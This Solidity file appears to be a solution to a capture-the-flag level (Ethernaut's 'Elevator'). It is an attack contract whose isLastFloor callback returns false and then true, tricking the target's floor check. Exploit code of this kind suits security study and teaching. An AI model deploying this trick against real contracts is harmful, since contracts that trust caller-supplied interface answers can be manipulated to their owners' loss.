// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
  uint8 count;

  function attack(address _elevator) public {
    Elevator(_elevator).goTo(0);
  }

  function isLastFloor(uint) external returns (bool) {
    count++;
    if (count > 1) {
        return true;
    }
    return false;
  }
}